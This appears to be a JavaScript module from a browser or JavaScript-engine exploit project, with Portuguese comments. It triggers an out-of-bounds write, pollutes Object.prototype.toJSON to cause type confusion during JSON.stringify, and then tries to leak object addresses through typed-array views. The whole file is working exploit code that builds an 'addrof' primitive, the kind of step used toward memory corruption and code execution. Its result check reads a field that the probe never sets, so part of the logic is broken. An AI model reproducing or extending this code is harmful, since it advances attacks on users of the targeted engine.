// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - REVISADO 5)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF, 0x7FFFFFFF];

// Globais do módulo, resetados por iteração
let object_to_leak_A_v82 = null;
let object_to_leak_B_v82 = null;
let victim_typed_array_ref_v82 = null;
let probe_call_count_v82 = 0;
let marker_M1_ref_v82 = null;
let marker_M2_ref_v82 = null;
let details_of_M2_as_this_call_v82 = null; 
let details_of_M2_CAPTURED_FLAG = false;    

const PROBE_CALL_LIMIT_V82 = 7;
const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;

function toJSON_TA_Probe_AdvancedGetterLeak() {
    probe_call_count_v82++;
    const call_num = probe_call_count_v82; 

    const current_this_type_str = Object.prototype.toString.call(this);
    const is_this_M2_confused = (this === marker_M2_ref_v82 && marker_M2_ref_v82 !== null && current_this_type_str === '[object Object]');

    logS3(`[PROBE_V82] Call #${call_num}. 'this': ${current_this_type_str}. IsVictim? ${this === victim_typed_array_ref_v82}. IsM1? ${this === marker_M1_ref_v82}. IsM2Raw? ${this === marker_M2_ref_v82}. IsM2Confused? ${is_this_M2_confused}. CapturedFlag: ${details_of_M2_CAPTURED_FLAG}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V82) { return { recursion_stopped_v82: true, reason: "Probe call limit exceeded" }; }

        if (call_num === 1 && this === victim_typed_array_ref_v82) {
            marker_M2_ref_v82 = { marker_id_v82: "M2_V82_Target", some_prop_M2: "M2_Initial_Value" };
            marker_M1_ref_v82 = { marker_id_v82: "M1_V82_Container", payload_M2: marker_M2_ref_v82 };
            logS3(`[PROBE_V82] Call #${call_num} (Victim): M1 and M2 markers created. Returning M1.`, "info");
            return marker_M1_ref_v82;
        } else if (is_this_M2_confused) {
            logS3(`[PROBE_V82] Call #${call_num} (M2 Confused): TYPE CONFUSION ON M2 ('this') DETECTED! ID: ${this.marker_id_v82}. Defining getter/property...`, "vuln");
            
            let m2_interaction_log_entry = {
                call_number: call_num, 
                probe_variant: "TA_Probe_V82_AdvancedGetterLeak",
                this_type: "[object Object]", 
                this_is_victim: false, this_is_M1: false, this_is_M2: true, 
                getter_defined: false, direct_prop_set: false,
                getter_fired_during_stringify: false,
                leaked_value_from_getter_as_int64_str: null,
                leaked_value_is_potential_ptr: false,
                error_in_probe: null
            };

            Object.defineProperty(this, 'leaky_A_getter_v82', {
                get: function() { 
                    logS3(`[PROBE_V82] !!! Getter 'leaky_A_getter_v82' (defined in M2 probe call #${m2_interaction_log_entry.call_number}) FIRED !!!`, "vuln");
                    m2_interaction_log_entry.getter_fired_during_stringify = true;

                    if (!victim_typed_array_ref_v82 || !victim_typed_array_ref_v82.buffer) {
                        logS3("[PROBE_V82] Getter: victim_typed_array_ref_v82 or its buffer is null!", "error");
                        m2_interaction_log_entry.leaked_value_from_getter_as_int64_str = "getter_victim_null_err";
                        return "getter_victim_null_err";
                    }

                    let victim_float_view = new Float64Array(victim_typed_array_ref_v82.buffer);
                    let victim_u32_view = new Uint32Array(victim_typed_array_ref_v82.buffer);
                    const original_victim_val_idx0_low = victim_u32_view[0];
                    const original_victim_val_idx1 = victim_u32_view[1];

                    victim_float_view[0] = object_to_leak_A_v82;
                    let leaked_val_raw_float = victim_float_view[0];
                    let leaked_low = victim_u32_view[0];
                    let leaked_high = victim_u32_view[1];
                    let leaked_int64_obj = new AdvancedInt64(leaked_low, leaked_high);
                    const leaked_int64_str = leaked_int64_obj.toString(true);
                    
                    m2_interaction_log_entry.leaked_value_from_getter_as_int64_str = leaked_int64_str;
                    logS3(`[PROBE_V82] Getter: VictimView[0] after objA assign: Float=${leaked_val_raw_float}, HexLow=${toHex(leaked_low)}, HexHigh=${toHex(leaked_high)} (Int64: ${leaked_int64_str})`, "leak");
                    
                    victim_u32_view[0] = original_victim_val_idx0_low;
                    victim_u32_view[1] = original_victim_val_idx1;

                    const is_nan_or_inf_high_word = (leaked_high >= 0x7FF00000 && leaked_high < 0x80000000) || 
                                                    (leaked_high >= 0xFFF00000 && leaked_high < 0x100000000);

                    if (!is_nan_or_inf_high_word && leaked_high !== 0) {
                        const is_likely_kernel_range = (leaked_high >= 0xFFFF0000);
                        const is_likely_user_heap_range_low = (leaked_high > 0x00000000 && leaked_high < 0x000F0000);
                        const is_likely_user_module_range = (leaked_high >= 0x00100000 && leaked_high < 0x7F000000);

                        if (is_likely_kernel_range || is_likely_user_heap_range_low || is_likely_user_module_range) {
                            logS3(`[PROBE_V82] Getter: Potential pointer leaked: ${leaked_int64_str} (Heuristic Match)`, "vuln");
                            m2_interaction_log_entry.leaked_value_is_potential_ptr = true;
                            return leaked_val_raw_float;
                        } else {
                            logS3(`[PROBE_V82] Getter: Value ${leaked_int64_str} not NaN/Inf, but NOT in likely pointer ranges.`, "info");
                            return "getter_val_not_in_ptr_range";
                        }
                    } else {
                        if (is_nan_or_inf_high_word) logS3(`[PROBE_V82] Getter: Value ${leaked_int64_str} is NaN or Infinity.`, "warn");
                        else logS3(`[PROBE_V82] Getter: Value ${leaked_int64_str} is likely NULL or zero.`, "info");
                        return "getter_val_is_nan_inf_or_zero";
                    }
                },
                enumerable: true, configurable: true
            });
            m2_interaction_log_entry.getter_defined = true;

            this.leaky_B_direct_v82 = object_to_leak_B_v82;
            m2_interaction_log_entry.direct_prop_set = true;
            logS3(`[PROBE_V82] Call #${call_num} (M2 Confused): Getter e propriedade direta definidos. Retornando 'this' (M2).`, "info");
            
            if (!details_of_M2_CAPTURED_FLAG) {
                details_of_M2_as_this_call_v82 = JSON.parse(JSON.stringify(m2_interaction_log_entry)); 
                details_of_M2_CAPTURED_FLAG = true; // Set flag AFTER successful capture
                logS3(`[PROBE_V82] Call #${m2_interaction_log_entry.call_number} (M2 Confused): M2 details CAPTURED. Flag SET. Value: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "vuln");
            } else {
                 logS3(`[PROBE_V82] Call #${call_num} (M2 Confused): M2 details CAPTURE SKIPPED (flag was true). Current global details: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "warn");
            }
            return this;
        } else { // Not call #1 and not M2 confused
            logS3(`[PROBE_V82] Call #${call_num} (Other): Not M2 confused and not first call. Flag is ${details_of_M2_CAPTURED_FLAG}. Global M2 details: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "info");
        }
    } catch (e) {
        const error_message = e.message || String(e);
        logS3(`[PROBE_V82] Call #${call_num}: ERROR in probe: ${error_message}${e.stack ? '\n' + e.stack : ''}`, "error");
        if (is_this_M2_confused && details_of_M2_as_this_call_v82 && details_of_M2_as_this_call_v82.call_number === call_num) {
            details_of_M2_as_this_call_v82.error_in_probe = error_message;
        }
        return { error_in_probe_marker: call_num, message: error_message };
    }
    return { generic_marker_v82: call_num, original_this_type: current_this_type_str };
}

// O restante de executeTypedArrayVictimAddrofTest_AdvancedGetterLeak permanece o mesmo da Revisado 4 / 3
// pois ele já foi ajustado para definir heisenbugConfirmedThisIter corretamente e usar
// details_of_M2_as_this_call_v82 para suas verificações.
export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (AdvancedGetterLeak) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init...`;

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null,
        toJSON_details: null,
        stringifyResult: null,
        addrof_A_result: { success: false, msg: "Addrof A (Getter): Not triggered or failed.", value: null },
        addrof_B_result: { success: false, msg: "Addrof B (Direct): Not triggered or failed.", value: null },
        oob_value_used: null,
        heisenbug_on_M2_confirmed: false
    };
    let OOBEnvironmentCleaned = false;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v82 = 0;
        victim_typed_array_ref_v82 = null;
        marker_M1_ref_v82 = null;
        marker_M2_ref_v82 = null;
        details_of_M2_as_this_call_v82 = null; 
        details_of_M2_CAPTURED_FLAG = false; // Reset flag for each iteration
        object_to_leak_A_v82 = { marker_A_v82: `LeakA_OOB_Val${toHex(current_oob_value)}` };
        object_to_leak_B_v82 = { marker_B_v82: `LeakB_OOB_Val${toHex(current_oob_value)}` };
        OOBEnvironmentCleaned = false;

        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;
        let iter_error = null;
        let iter_addrof_A = { success: false, msg: "Getter: Default", value: null };
        let iter_addrof_B = { success: false, msg: "Direct: Default", value: null };
        let heisenbugConfirmedThisIter = false; 
        let captured_m2_details_for_log_stable = null; 

        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write done for iter Val${toHex(current_oob_value)}. Offset: ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_v82 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE));
            new Float64Array(victim_typed_array_ref_v82.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            logS3(`  Victim Uint8Array (size ${VICTIM_BUFFER_SIZE}) created and filled.`, "info", FNAME_CURRENT_ITERATION);

            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_AdvancedGetterLeak, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                logS3(`  Object.prototype.toJSON polluted. Calling JSON.stringify...`, "info", FNAME_CURRENT_ITERATION);

                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_v82);
                logS3(`  JSON.stringify iter Val${toHex(current_oob_value)} completed. Raw Output: ${iter_raw_stringify_output}`, "info", FNAME_CURRENT_ITERATION);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); }
                catch (e_parse) { iter_stringify_output_parsed = { error_parsing_json: iter_raw_stringify_output }; }
                
                // Check the module-level details_of_M2_as_this_call_v82 which should have been set by the M2 Confused probe call
                if (details_of_M2_as_this_call_v82 && 
                    details_of_M2_as_this_call_v82.this_is_M2 && 
                    details_of_M2_as_this_call_v82.this_type === "[object Object]") {
                    heisenbugConfirmedThisIter = true;
                    captured_m2_details_for_log_stable = JSON.parse(JSON.stringify(details_of_M2_as_this_call_v82));
                    logS3(`  EXECUTE: Heisenbug (Type Confusion on M2) for OOB_Val ${toHex(current_oob_value)} CONFIRMED.`, "vuln", FNAME_CURRENT_ITERATION);
                    logS3(`  EXECUTE: Captured M2 interaction details (stable log): ${JSON.stringify(captured_m2_details_for_log_stable)}`, "leak", FNAME_CURRENT_ITERATION);

                    const m2_summary = details_of_M2_as_this_call_v82.m2_interaction_summary;
                    if (m2_summary) {
                        iter_addrof_A.value = m2_summary.leaked_value_from_getter_as_int64_str;
                        if (m2_summary.leaked_value_is_potential_ptr) {
                            iter_addrof_A.success = true;
                            iter_addrof_A.msg = `Potential pointer from getter: ${m2_summary.leaked_value_from_getter_as_int64_str}`;
                            logS3(`  ADDROF_A SUCCESS (Heuristic): ${iter_addrof_A.msg}`, "vuln", FNAME_CURRENT_ITERATION);
                        } else {
                            iter_addrof_A.msg = `Getter value ${m2_summary.leaked_value_from_getter_as_int64_str || 'N/A'} not deemed pointer by heuristic.`;
                        }
                    } else {
                        iter_addrof_A.msg = "M2 interaction summary missing in captured details (details_of_M2_as_this_call_v82.m2_interaction_summary was null).";
                         logS3(`  WARN: M2 interaction summary missing. details_of_M2_as_this_call_v82 was: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "warn", FNAME_CURRENT_ITERATION);
                    }
                    
                    let m2_payload_from_stringify = null;
                    if (iter_stringify_output_parsed?.marker_id_v82 === "M1_V82_Container" && iter_stringify_output_parsed.payload_M2) {
                        m2_payload_from_stringify = iter_stringify_output_parsed.payload_M2;
                    } else if (iter_stringify_output_parsed?.marker_id_v82 === "M2_V82_Target") {
                        m2_payload_from_stringify = iter_stringify_output_parsed;
                    }

                    if (m2_payload_from_stringify?.marker_id_v82 === "M2_V82_Target") {
                        const val_direct_result = m2_payload_from_stringify.leaky_B_direct_v82;
                        iter_addrof_B.value = val_direct_result;
                        if (val_direct_result && val_direct_result.marker_B_v82 === object_to_leak_B_v82.marker_B_v82) {
                            iter_addrof_B.success = true;
                            iter_addrof_B.msg = `object_to_leak_B_v82 identity confirmed from direct property.`;
                            logS3(`  ADDROF_B SUCCESS (Identity): ${iter_addrof_B.msg}`, "vuln", FNAME_CURRENT_ITERATION);
                        } else {
                            iter_addrof_B.msg = `Direct prop leaky_B_direct_v82 value: ${JSON.stringify(val_direct_result)}, not objB identity.`;
                        }
                    } else {
                         iter_addrof_B.msg = "M2 payload not found in stringify output for leaky_B check.";
                    }
                } else {
                    logS3(`  EXECUTE: Heisenbug (Type Confusion on M2) for OOB_Val ${toHex(current_oob_value)} NOT Confirmed. Probe details stored in details_of_M2_as_this_call_v82: ${JSON.stringify(details_of_M2_as_this_call_v82)}`, "error", FNAME_CURRENT_ITERATION);
                    iter_addrof_A.msg = "TC on M2 not confirmed.";
                    iter_addrof_B.msg = "TC on M2 not confirmed.";
                }

            } catch (e_str) {
                iter_error = e_str;
                logS3(`  ERROR during JSON.stringify or probe execution: ${e_str.message}${e_str.stack ? '\n' + e_str.stack : ''}`, "critical", FNAME_CURRENT_ITERATION);
            } finally {
                if (pollutionApplied) {
                    if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                    else delete Object.prototype[ppKey];
                    logS3(`  Object.prototype.toJSON restored.`, "info", FNAME_CURRENT_ITERATION);
                }
            }
        } catch (e_outer) {
            iter_error = e_outer;
            logS3(`  CRITICAL ERROR in outer try-catch for iteration ${toHex(current_oob_value)}: ${e_outer.message}${e_outer.stack ? '\n' + e_outer.stack : ''}`, "critical", FNAME_CURRENT_ITERATION);
        } finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
            OOBEnvironmentCleaned = true;
            logS3(`  OOB Environment cleared for iteration ${toHex(current_oob_value)}.`, "info", FNAME_CURRENT_ITERATION);
        }

        let current_iter_summary = {
            oob_value: toHex(current_oob_value),
            error: iter_error ? (iter_error.message || String(iter_error)) : null,
            toJSON_details_this_iter: details_of_M2_as_this_call_v82, 
            stringify_output_this_iter: iter_stringify_output_parsed,
            addrof_A_this_iter: iter_addrof_A,
            addrof_B_this_iter: iter_addrof_B,
            heisenbug_on_M2_this_iter: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);
        
        const old_best_score = (best_result_for_runner.addrof_A_result.success || best_result_for_runner.addrof_B_result.success) ? 2 : (best_result_for_runner.heisenbug_on_M2_confirmed ? 1 : 0);
        const current_score = (iter_addrof_A.success || iter_addrof_B.success) ? 2 : (heisenbugConfirmedThisIter ? 1 : 0);

        if (current_score > old_best_score || (current_score === old_best_score && !best_result_for_runner.oob_value_used) || (current_score > 0 && !best_result_for_runner.oob_value_used && current_score >= old_best_score) ) {
             best_result_for_runner = {
                errorOccurred: iter_error ? (iter_error.message || String(iter_error)) : null,
                toJSON_details: details_of_M2_as_this_call_v82, // Captura o estado final da global do módulo
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result: iter_addrof_A,
                addrof_B_result: iter_addrof_B,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed: heisenbugConfirmedThisIter
            };
        } else if (!best_result_for_runner.oob_value_used && current_oob_value === OOB_WRITE_VALUES_V82[OOB_WRITE_VALUES_V82.length - 1]) {
             best_result_for_runner = {
                errorOccurred: iter_error ? (iter_error.message || String(iter_error)) : best_result_for_runner.errorOccurred,
                toJSON_details: details_of_M2_as_this_call_v82,
                stringifyResult: iter_stringify_output_parsed,
                addrof_A_result: iter_addrof_A,
                addrof_B_result: iter_addrof_B,
                oob_value_used: toHex(current_oob_value),
                heisenbug_on_M2_confirmed: heisenbugConfirmedThisIter
            };
        }
        
        if (iter_addrof_A.success || iter_addrof_B.success) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: AddrLeaked! Val${toHex(current_oob_value)}`;
        } else if (heisenbugConfirmedThisIter) {
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}: TC Confirmed Val${toHex(current_oob_value)}`;
        }


        await PAUSE_S3(200);
    }

    if (!OOBEnvironmentCleaned && OOB_WRITE_VALUES_V82.length === 0) {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result for runner (detailed): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return {
        errorOccurred: best_result_for_runner.errorOccurred,
        toJSON_details: best_result_for_runner.toJSON_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_A_result: best_result_for_runner.addrof_A_result,
        addrof_B_result: best_result_for_runner.addrof_B_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: probe_call_count_v82,
        oob_value_of_best_result: best_result_for_runner.oob_value_used,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed
    };
}
